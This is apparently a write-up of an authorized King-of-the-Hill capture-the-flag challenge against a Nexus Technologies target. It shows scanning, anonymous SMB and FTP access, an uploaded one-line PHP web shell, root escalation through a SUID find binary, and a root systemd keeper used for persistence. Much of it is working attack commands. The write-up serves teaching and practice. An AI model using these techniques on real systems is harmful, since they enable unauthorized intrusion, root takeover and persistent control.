# Nexus Technologies KOTH Write-up

## Target and objective

- Target: `165.22.240.91`
- Flag formats: `Legion{...}` and `KOTH(...)`
- King objective: write `MiliX` to `/root/king.txt` and retain control

This work was performed against the authorized KOTH challenge target.

## 1. Service enumeration

A full TCP scan was started, followed by quicker validation of common ports:

```bash
nmap -Pn -sV -sC -p- 165.22.240.91
```

The important exposed services were:

| Port | Service | Finding |
|---:|---|---|
| 21 | FTP | Anonymous access; banner claimed ProFTPD 1.3.3c |
| 22 | SSH | Several challenge users could log in |
| 80 | HTTP | PHP portfolio with a suspicious `viewer.php?page=` parameter |
| 139/445 | SMB | Anonymous `CompanyShare` share |
| 3000 | HTTP | Flask/Werkzeug client portal and `/admin` login |
| 3306 | MySQL | MariaDB exposed |
| 8080 | HTTP | PHP document-upload application |

The ProFTPD 1.3.3c banner suggested the historical `HELP ACIDBITCHEZ` backdoor. It was tested, but port 6200 never opened. The banner was therefore a decoy or represented a patched build.

## 2. Anonymous SMB disclosure

Anonymous SMB enumeration exposed `CompanyShare`:

```bash
smbclient -N -L //165.22.240.91
smbclient -N //165.22.240.91/CompanyShare -c 'recurse; ls'
```

Files in the share included:

- `IT_Notice.txt`
- `Onboarding_2024.txt`
- `helpdesk_tickets.txt`
- `fl4g.txt`

The first flag was directly readable:

```text
Legion{2e3f4a5b6c7d8e9f2e3f4a5b6c7d8e9f}
```

`IT_Notice.txt` disclosed the username `hiruna` and described a password rotation from `Admin@2025` by incrementing the year. This was useful context, although the guessed portal credentials did not authenticate to `/admin`.

## 3. Anonymous FTP and document application

Anonymous FTP listed the PHP document application's files and uploads:

```bash
curl --user anonymous:x ftp://165.22.240.91/
curl --user anonymous:x ftp://165.22.240.91/uploads/
```

Port 8080 identified itself as `NexusDocs`. Its upload form explicitly accepted all file types, and uploaded `.php` files were stored under `/uploads/` and executed by PHP-FPM.

An existing upload confirmed command execution as `phpapp`:

```text
uid=1003(phpapp) gid=1003(phpapp) groups=1003(phpapp)
```

A minimal command endpoint was uploaded through the document form:

```php
<?php echo `$_GET[x]`; ?>
```

Example execution:

```bash
curl -G --data-urlencode 'x=id' \
  http://165.22.240.91:8080/uploads/koth_exec.php
```

This produced a reliable shell-equivalent channel as `phpapp`.

## 4. Local enumeration and privilege escalation

Enumeration checked sudo rights, SUID binaries, capabilities, cron jobs, processes, and writable files:

```bash
sudo -n -l
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
cat /etc/crontab
ps auxww
```

The key finding was an unsafe SUID installation of GNU `find`:

```text
/usr/bin/find
```

GNU `find` can execute another program with `-exec`. Because it had the SUID bit, invoking a preserved-privilege shell yielded effective UID 0:

```bash
/usr/bin/find /tmp -maxdepth 0 \
  -exec /bin/bash -p -c 'id' \;
```

Result:

```text
uid=1003(phpapp) gid=1003(phpapp) euid=0(root)
```

The important detail is `euid=0(root)`. This provided access to `/root`, even though the real UID remained `phpapp`.

## 5. Flag collection

With effective root privileges, flags were searched across the challenge and application directories:

```bash
grep -RahoE '(Legion|Leigon)\{[^}]+\}|KOTH\([^)]*\)' \
  /root /home /var/www /opt /srv /etc /var/backups \
  /var/lib/mysql /usr/local 2>/dev/null | sort -u
```

Valid-looking flags found:

```text
Legion{1d2c3b4a59687f0e1d2c3b4a59687f0e}
Legion{2e3f4a5b6c7d8e9f2e3f4a5b6c7d8e9f}
Legion{3c4d5e6f7a8b90c13c4d5e6f7a8b90c1}
Legion{4b5c6d7e8f9a01d24b5c6d7e8f9a01d2}
Legion{5a6b7c8d9e0f12e35a6b7c8d9e0f12e3}
Legion{9f8e7d6c5b4a32019f8e7d6c5b4a3201}
Legion{a1b2c3d4e5f60718a1b2c3d4e5f60718}
Legion{a3f5c9d2e8b10476a3f5c9d2e8b10476}
Legion{b4e6d0a3f9c21587b4e6d0a3f9c21587}
Legion{c5f7e1b4a0d32698c5f7e1b4a0d32698}
Legion{d6a8f2c5b1e43709d6a8f2c5b1e43709}
Legion{e7b9a3d6c2f5480ae7b9a3d6c2f5480a}
Legion{e821ee31c20d6c68c59953b615ee2d03}
Legion{f8c0b4e7d3a6591bf8c0b4e7d3a6591b}
```

The root flag was:

```text
Legion{a1b2c3d4e5f60718a1b2c3d4e5f60718}
```

The following value explicitly identified itself as a decoy and should not be submitted:

```text
Legion{d3c0y_keep_enumerating_not_scored}
```

## 6. Taking king

The initial king write was straightforward with the SUID `find` primitive:

```bash
/usr/bin/find /tmp -maxdepth 0 \
  -exec /bin/bash -p -c \
  'printf %s MiliX > /root/king.txt' \;
```

Verification:

```bash
cat /root/king.txt
```

Expected output:

```text
MiliX
```

## 7. Contesting the king file

Another player repeatedly restored `ZAARA`. Investigation found their persistent service:

```text
/etc/systemd/system/zaara-king.service
/usr/local/sbin/zaara-king.sh
```

The service was disabled, and its files were moved into a disabled-backup directory rather than destroyed:

```bash
systemctl disable --now zaara-king.service
mkdir -p /root/.disabled-keepers
mv /etc/systemd/system/zaara-king.service /root/.disabled-keepers/
mv /usr/local/sbin/zaara-king.sh /root/.disabled-keepers/
systemctl daemon-reload
```

The opponent had also applied the Linux immutable inode flag to `king.txt`. The host lacked the `chattr` and `lsattr` utilities, so the flag was managed through Python's `fcntl.ioctl` interface:

```python
import fcntl
import os
import struct

path = "/root/king.txt"
fd = os.open(path, os.O_RDONLY)
data = bytearray(4)
fcntl.ioctl(fd, 0x80086601, data, True)  # FS_IOC_GETFLAGS
flags = struct.unpack("I", data)[0]
fcntl.ioctl(fd, 0x40086602, struct.pack("I", flags & ~16))
os.close(fd)
```

After clearing `FS_IMMUTABLE_FL` (`0x10`), the file was rewritten, changed to `root:root` mode `0600`, and made immutable again.

## 8. Keeper service

A root systemd keeper was installed to check the file frequently. If another player removes the immutable flag and changes the value, the keeper clears immutability, restores `MiliX`, fixes ownership and permissions, and reapplies immutability.

The service used:

```ini
[Unit]
Description=MiliX KOTH King Keeper
After=multi-user.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 /usr/local/sbin/.milix_keeper.py
Restart=always
RestartSec=0

[Install]
WantedBy=multi-user.target
```

It was enabled and started with:

```bash
systemctl daemon-reload
systemctl enable --now milix-king.service
```

Final verification showed:

```text
KING=MiliX
enabled
active
```

The temporary PHP command endpoint was removed after each operation so it would not become an easy entry point for another team.

## 9. Lessons learned

1. Validate banners before committing to a public exploit; the ProFTPD backdoor path was a decoy.
2. Anonymous shares often contain both flags and credential clues.
3. Upload validation must consider execution behavior, not merely filename acceptance.
4. A SUID copy of a general-purpose tool such as `find` is effectively a root shell.
5. In KOTH, writing the king file once is insufficient; competing services and immutable flags must be investigated.
6. Avoid indiscriminately killing every SSH terminal: it can disconnect your own operator. Target sessions only after positively identifying the operator's username or source address.
